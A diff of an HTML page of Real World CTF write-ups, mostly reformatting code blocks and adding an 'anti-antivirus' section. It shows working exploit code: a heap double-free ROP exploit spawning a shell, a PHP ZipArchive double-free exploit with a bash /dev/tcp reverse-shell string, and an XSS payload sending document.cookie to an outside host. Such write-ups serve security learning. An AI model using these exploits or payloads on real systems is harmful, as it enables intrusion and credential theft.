@@ -148,6 +148,8 @@
     
                 <a class="dropdown-item" href="#fax-sender">fax-sender</a>
     
+                <a class="dropdown-item" href="#anti-antivirus">anti-antivirus</a>
+    
                 <a class="dropdown-item" href="#mop">mop</a>
     
               </div>
@@ -220,6 +222,10 @@
     
 <a href="#fax-sender" class="list-group-item list-group-item-action text-white bg-dark">
               <span class="menu-collapsed">fax-sender</span>
+            </a>
+    
+<a href="#anti-antivirus" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">anti-antivirus</span>
             </a>
     
 <a href="#mop" class="list-group-item list-group-item-action text-white bg-dark">
@@ -342,6 +348,7 @@ ff=<span class="hljs-string">""</span>
 for i in flag:
   ff+=chr(int(str(s.model()[i])))
 print ff
+
 </code></pre><h3 id="caidanti"><a class="header-link" href="#caidanti"></a>Caidanti</h3>
 <pre class="hljs"><code>from pwn import *
 context.arch=<span class="hljs-string">"amd64"</span>
@@ -400,6 +407,7 @@ r.sendline(<span class="hljs-keyword">str</span>(len(pp)))
 r.send(pp)
 
 r.interactive()
+
 </code></pre><h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
 <h3 id="across-the-great-wall"><a class="header-link" href="#across-the-great-wall"></a>Across the Great Wall</h3>
 <pre class="hljs"><code><span class="hljs-built_in">import</span> hashlib
@@ -472,89 +480,106 @@ rrr.send(p64(libc+<span class="hljs-number">0</span>xe5858))
 s.interactive()
 
 
+
 </code></pre><h3 id="fax-sender"><a class="header-link" href="#fax-sender"></a>faX senDeR</h3>
 <ul class="list">
 <li>delete_msg didn&#39;t clean the pointer.</li>
 <li>add_msg with an invalid size, it won&#39;t set the new pinter, old pointer remained.</li>
-<li>double free
-<code>`</code>python=
-#!/usr/bin/env python
-from pwn import *</li>
+<li>double free</li>
 </ul>
-<h1 id="rwctf{digging_into_libxdr}"><a class="header-link" href="#rwctf{digging_into_libxdr}"></a>rwctf{Digging_Into_libxdr}</h1>
-<p>context.arch = &#39;amd64&#39;
-y = remote( &#39;tcp.realworldctf.com&#39; , 10917 )</p>
-<p>def add_con( len , name , l2 , ip ):
-    p = p32( 1 , endian = &#39;big&#39; )
-    p += p32( 1 , endian = &#39;big&#39; )
-    p += p32( len , endian = &#39;big&#39; ) + name.ljust( len , &#39;\0&#39; )
-    p += p32( l2 , endian = &#39;big&#39; )
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># rwctf{Digging_Into_libxdr}</span>
+
+context.arch = <span class="hljs-string">'amd64'</span>
+y = remote( <span class="hljs-string">'tcp.realworldctf.com'</span> , <span class="hljs-number">10917</span> )
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_con</span><span class="hljs-params">( len , name , l2 , ip )</span>:</span>
+    p = p32( <span class="hljs-number">1</span> , endian = <span class="hljs-string">'big'</span> )
+    p += p32( <span class="hljs-number">1</span> , endian = <span class="hljs-string">'big'</span> )
+    p += p32( len , endian = <span class="hljs-string">'big'</span> ) + name.ljust( len , <span class="hljs-string">'\0'</span> )
+    p += p32( l2 , endian = <span class="hljs-string">'big'</span> )
     p += ip
-    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
-    r = y.recv( 0x1000 )
-    print r[:0x20]</p>
-<p>def list_con():
-    p = p32( 2 , endian = &#39;big&#39; )
-    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
-    r = y.recv( 0x1000 )
-    print r[:0x100]</p>
-<p>def dle_con( idx ):
-    p = p32( 3 , endian = &#39;big&#39; )
-    p += p32( idx , endian = &#39;big&#39; )
-    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
-    r = y.recv( 0x1000 )
-    print r[:0x50]</p>
-<p>def add_msg( to , l , msg ):
-    p = p32( 4 , endian = &#39;big&#39; )
-    p += p32( to , endian = &#39;big&#39; )
-    p += p32( l , endian = &#39;big&#39; )
+    y.send( p.ljust( <span class="hljs-number">0x100</span> , <span class="hljs-string">'\0'</span> ) )
+    r = y.recv( <span class="hljs-number">0x1000</span> )
+    <span class="hljs-keyword">print</span> r[:<span class="hljs-number">0x20</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_con</span><span class="hljs-params">()</span>:</span>
+    p = p32( <span class="hljs-number">2</span> , endian = <span class="hljs-string">'big'</span> )
+    y.send( p.ljust( <span class="hljs-number">0x100</span> , <span class="hljs-string">'\0'</span> ) )
+    r = y.recv( <span class="hljs-number">0x1000</span> )
+    <span class="hljs-keyword">print</span> r[:<span class="hljs-number">0x100</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dle_con</span><span class="hljs-params">( idx )</span>:</span>
+    p = p32( <span class="hljs-number">3</span> , endian = <span class="hljs-string">'big'</span> )
+    p += p32( idx , endian = <span class="hljs-string">'big'</span> )
+    y.send( p.ljust( <span class="hljs-number">0x100</span> , <span class="hljs-string">'\0'</span> ) )
+    r = y.recv( <span class="hljs-number">0x1000</span> )
+    <span class="hljs-keyword">print</span> r[:<span class="hljs-number">0x50</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_msg</span><span class="hljs-params">( to , l , msg )</span>:</span>
+    p = p32( <span class="hljs-number">4</span> , endian = <span class="hljs-string">'big'</span> )
+    p += p32( to , endian = <span class="hljs-string">'big'</span> )
+    p += p32( l , endian = <span class="hljs-string">'big'</span> )
     p += msg
-    y.send( p.ljust( 0x100 , &#39;\0&#39; )[:0x1000] )
-    r = y.recv( 0x1000 )
-    print r[:0x20]</p>
-<p>def dle_msg( idx ):
-    p = p32( 6 , endian = &#39;big&#39; )
-    p += p32( idx , endian = &#39;big&#39; )
-    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
-    r = y.recv( 0x1000 )
-    print r[:0x50]</p>
-<p>def list_msg():
-    p = p32( 5 , endian = &#39;big&#39; )
-    y.send( p.ljust( 0x100 , &#39;\0&#39; ) )
-    r = y.recv( 0x1000 )
-    print r[:0x100]</p>
-<p>add_con( 0x100 , &#39;a&#39; <em> 0x50 , 0x10 , &#39;1&#39; </em> 0x10 )</p>
-<p>add_msg( 0 , 0x68 , &#39;A&#39; <em> 0x10 )
-dle_msg(0)
-add_msg( 0 , 0x2000 , &#39;A&#39; </em> 0x10 )
-dle_msg(0)</p>
-<p>free_hook = 0x6BEE98
-pop_rdi = 0x400686
-pop_rsi = 0x410df3
-pop_rdx = 0x44a175
-pop_rax = 0x44a11c
-syscall = 0x47db6f</p>
-<p>p = flat(
+    y.send( p.ljust( <span class="hljs-number">0x100</span> , <span class="hljs-string">'\0'</span> )[:<span class="hljs-number">0x1000</span>] )
+    r = y.recv( <span class="hljs-number">0x1000</span> )
+    <span class="hljs-keyword">print</span> r[:<span class="hljs-number">0x20</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dle_msg</span><span class="hljs-params">( idx )</span>:</span>
+    p = p32( <span class="hljs-number">6</span> , endian = <span class="hljs-string">'big'</span> )
+    p += p32( idx , endian = <span class="hljs-string">'big'</span> )
+    y.send( p.ljust( <span class="hljs-number">0x100</span> , <span class="hljs-string">'\0'</span> ) )
+    r = y.recv( <span class="hljs-number">0x1000</span> )
+    <span class="hljs-keyword">print</span> r[:<span class="hljs-number">0x50</span>]
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list_msg</span><span class="hljs-params">()</span>:</span>
+    p = p32( <span class="hljs-number">5</span> , endian = <span class="hljs-string">'big'</span> )
+    y.send( p.ljust( <span class="hljs-number">0x100</span> , <span class="hljs-string">'\0'</span> ) )
+    r = y.recv( <span class="hljs-number">0x1000</span> )
+    <span class="hljs-keyword">print</span> r[:<span class="hljs-number">0x100</span>]
+
+
+add_con( <span class="hljs-number">0x100</span> , <span class="hljs-string">'a'</span> * <span class="hljs-number">0x50</span> , <span class="hljs-number">0x10</span> , <span class="hljs-string">'1'</span> * <span class="hljs-number">0x10</span> )
+
+add_msg( <span class="hljs-number">0</span> , <span class="hljs-number">0x68</span> , <span class="hljs-string">'A'</span> * <span class="hljs-number">0x10</span> )
+dle_msg(<span class="hljs-number">0</span>)
+add_msg( <span class="hljs-number">0</span> , <span class="hljs-number">0x2000</span> , <span class="hljs-string">'A'</span> * <span class="hljs-number">0x10</span> )
+dle_msg(<span class="hljs-number">0</span>)
+
+free_hook = <span class="hljs-number">0x6BEE98</span>
+pop_rdi = <span class="hljs-number">0x400686</span>
+pop_rsi = <span class="hljs-number">0x410df3</span>
+pop_rdx = <span class="hljs-number">0x44a175</span>
+pop_rax = <span class="hljs-number">0x44a11c</span>
+syscall = <span class="hljs-number">0x47db6f</span>
+
+
+p = flat(
     pop_rdi,
-    free_hook - 8,
+    free_hook - <span class="hljs-number">8</span>,
     pop_rsi,
-    0,
+    <span class="hljs-number">0</span>,
     pop_rdx,
-    0,
+    <span class="hljs-number">0</span>,
     pop_rax,
-    0x3b,
+    <span class="hljs-number">0x3b</span>,
     syscall
-)</p>
-<p>add_msg( 0 , 0x68 , p64( free_hook - 8 ) )
-add_msg( 0 , 0x68 , p )
-add_msg( 0 , 0x68 , &#39;/bin/sh\0&#39; + p64( 0x4a9678 ) ) # xchg eax, edi ; xchg eax, esp ; ret</p>
-<p>dle_msg(1) # trgger __free_hook -&gt; stack pivot</p>
-<p>y.interactive()</p>
-<pre class="hljs"><code>
-<span class="hljs-meta">### anti-antivirus</span>
-* Use rarvmtools to create rar file <span class="hljs-keyword">and</span> upload.
-```c=
-<span class="hljs-meta">#include &lt;constants.rh&gt;</span>
+)
+
+add_msg( <span class="hljs-number">0</span> , <span class="hljs-number">0x68</span> , p64( free_hook - <span class="hljs-number">8</span> ) )
+add_msg( <span class="hljs-number">0</span> , <span class="hljs-number">0x68</span> , p )
+add_msg( <span class="hljs-number">0</span> , <span class="hljs-number">0x68</span> , <span class="hljs-string">'/bin/sh\0'</span> + p64( <span class="hljs-number">0x4a9678</span> ) ) <span class="hljs-comment"># xchg eax, edi ; xchg eax, esp ; ret</span>
+
+dle_msg(<span class="hljs-number">1</span>) <span class="hljs-comment"># trgger __free_hook -&gt; stack pivot</span>
+
+y.interactive()
+</code></pre><h3 id="anti-antivirus"><a class="header-link" href="#anti-antivirus"></a>anti-antivirus</h3>
+<ul class="list">
+<li>Use rarvmtools to create rar file and upload.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-meta">#include &lt;constants.rh&gt;</span>
 <span class="hljs-meta">#include &lt;crctools.rh&gt;</span>
 <span class="hljs-meta">#include &lt;math.rh&gt;</span>
 <span class="hljs-meta">#include &lt;util.rh&gt;</span>
@@ -606,11 +631,13 @@ add_msg( 0 , 0x68 , &#39;/bin/sh\0&#39; + p64( 0x4a9678 ) ) # xchg eax, edi ; xc
     <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">r1</span>,<span class="hljs-built_in">r4</span> 
     <span class="hljs-keyword">mov</span>     [<span class="hljs-built_in">r2</span>],<span class="hljs-built_in">r1</span>
     <span class="hljs-keyword">call</span>    $_success
+
 </code></pre><h3 id="mop"><a class="header-link" href="#mop"></a>MoP</h3>
 <p>First, we find out the commit version <code>37a8408e8</code> according to hint, and get diff info as below.</p>
 <pre class="hljs"><code>$ diff -r php-src<span class="hljs-regexp">/ext/</span>zip<span class="hljs-regexp">/php_zip.c no_realworld_php/</span>ext<span class="hljs-regexp">/zip/</span>php_zip.c
 <span class="hljs-number">1383</span>d1382
-&lt;         ze_obj-&gt;filename = <span class="hljs-keyword">NULL</span>;</code></pre><p>Obviously, There is a double free vulnerability we can exploit at ZipArchive class. 
+&lt;         ze_obj-&gt;filename = <span class="hljs-keyword">NULL</span>;
+</code></pre><p>Obviously, There is a double free vulnerability we can exploit at ZipArchive class. 
 In zend allocator, <code>_emalloc</code> does not check any metadata from the freed chunk,
 so we can simply get <code>arbitray read/write</code>. </p>
 <p>Leak the libc, overwrite <code>__free_hook</code>, and get reverse shell!!</p>
@@ -692,6 +719,7 @@ $zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dec/tcp/I
 $zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dev/tcp/IP/4444 0&gt;&amp;1";'</span>, int_to_string($libc_addr+<span class="hljs-number">0x4f440</span>).<span class="hljs-string">'GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG'</span>);
 
 <span class="hljs-meta">?&gt;</span></span>
+
 </code></pre><h4 id="open_basedir-bypass"><a class="header-link" href="#open_basedir-bypass"></a>open_basedir bypass</h4>
 <p>Rumor has that this exploit still works in this challenge, even if it&#39;s PHP 7.4 ~ 8. Then you can get those juicy addresses under <code>/proc</code> through <code>echo file_get_contents(&#39;/proc/self/maps&#39;);</code> Actually I didn&#39;t realize they still haven&#39;t fixed this bug...... It&#39;s almost half of a year ago.</p>
 <p>Please refer to <a href="https://twitter.com/edgarboda/status/1113839230608797696">@Blaklis_&#39;s tweet (@edgarboda retweets)</a></p>
@@ -700,7 +728,8 @@ $zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dev/tcp/I
 <p>The server uses scrapy with headless chromium to crawl the page. We search for some keyword about scrapy, and found <a href="https://medium.com/alertot/web-scraping-considered-dangerous-exploiting-the-telnet-service-in-scrapy-1-5-2-ad5260fea0db">this post</a>.</p>
 <p>I leverage somd <a href="https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/">DNS-based browser port scanning</a> technique to check that the <code>127.0.0.1:6023</code> is opened. The following DNS record for example.com is configured:</p>
 <pre class="hljs"><code>127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> <span class="hljs-selector-tag">example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">A</span>
-240<span class="hljs-selector-class">.240</span><span class="hljs-selector-class">.240</span><span class="hljs-selector-class">.240</span> <span class="hljs-selector-tag">example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">A</span></code></pre><p>And I found that the browser it will never send a request to <code>240.240.240.240</code>, which indicates that the port is opened. The reason is that chromium will always resolve to 127.0.0.1 first. For more detail you can refer to <a href="(https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/">my article</a>).</p>
+240<span class="hljs-selector-class">.240</span><span class="hljs-selector-class">.240</span><span class="hljs-selector-class">.240</span> <span class="hljs-selector-tag">example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-tag">A</span>
+</code></pre><p>And I found that the browser it will never send a request to <code>240.240.240.240</code>, which indicates that the port is opened. The reason is that chromium will always resolve to 127.0.0.1 first. For more detail you can refer to <a href="(https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/">my article</a>).</p>
 <p>Unfortunately, only scrapy &lt; 1.5.2 is vulnerable to this RCE explot, because the telnet is not even protected with password. For scrapy &gt;= 1.5.3, the telnet is protected with <a href="https://docs.scrapy.org/en/latest/topics/telnetconsole.html">8-byte password</a>.</p>
 <p>Then we got stuck here until the competition ended.</p>
 <p>According to <a href="https://twitter.com/phithon_xg/status/1173446436614094849">@phithon_xg&#39;s twitter</a>, scrapy will also expose a <a href="https://docs.scrapy.org/en/0.16/topics/scrapyd.html#web-interface">web API interface</a>.</p>
@@ -755,7 +784,8 @@ $zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dev/tcp/I
 
     <span class="hljs-keyword">var</span> tag = getUrlParam(<span class="hljs-string">"tag"</span>);
     setCookie(<span class="hljs-string">"tag"</span>, tag);
-    setElement(tag);</span></code></pre><ol class="list">
+    setElement(tag);
+</span></code></pre><ol class="list">
 <li>Bypass getCookie(&quot;attr&quot;): <code>url?tag=attrs=3</code></li>
 <li>Bypass <code>;</code> and <code>&amp;</code>: When <code>getCookie</code>, it will unescape special characters. We can use percent-encoding <code>%26</code> to bypass</li>
 <li>Using <code>&lt;a&gt;</code> to XSS without user interaction: The remote headless chrome bot will not interact with the page, so we have to come out a approach to trigger the XSS without user interaction.</li>
@@ -765,7 +795,8 @@ $zip2-&gt;addFromString(<span class="hljs-string">'bash -c "bash &gt; /dev/tcp/I
 <p>Payload:</p>
 <pre class="hljs"><code>http:<span class="hljs-regexp">//</span><span class="hljs-number">52.52</span>.<span class="hljs-number">236.217</span>:<span class="hljs-number">16401</span>/?tag=attrs=id%3Dfoo%2526onfocus%3Djavascript%3Afetch%28%27%2F%2F240.<span class="hljs-number">240.240</span>.<span class="hljs-number">240</span>%3A1234%3F%27%2Bdocument.cookie%29%2526href%3D%23foo<span class="hljs-comment">#foo</span>
 
-<span class="hljs-comment"># rwctf{fR0m1olotH!n9}</span></code></pre><h4 id="failed-attempts-1"><a class="header-link" href="#failed-attempts-1"></a>Failed Attempts</h4>
+<span class="hljs-comment"># rwctf{fR0m1olotH!n9}</span>
+</code></pre><h4 id="failed-attempts-1"><a class="header-link" href="#failed-attempts-1"></a>Failed Attempts</h4>
 <ul class="list">
 <li>Using CSS to triger javascript: We can inject <code>style</code> attribute thus we can perform CSS injection. Unfortunately in modern browsers, they do not support execute javascript in CSS.</li>
 <li><code>onmouseevent</code> + very large canvas: Once the user/bot&#39;s mouse moves into the page, it will trigger the event if we set a very large width and height in CSS. However this doesn&#39;t work because the remote bot will not interact with the page. There is no mouse event triggered.</li>
@@ -823,7 +854,8 @@ def main():
 
 main()
 
-# rwctf{P1Ain_SChNorr_n33Ds_m0re_5ecur1ty!}</code></pre>        </article>
+# rwctf{P1Ain_SChNorr_n33Ds_m0re_5ecur1ty!}
+</code></pre>        </article>
       </div>
     </div>
   </body>
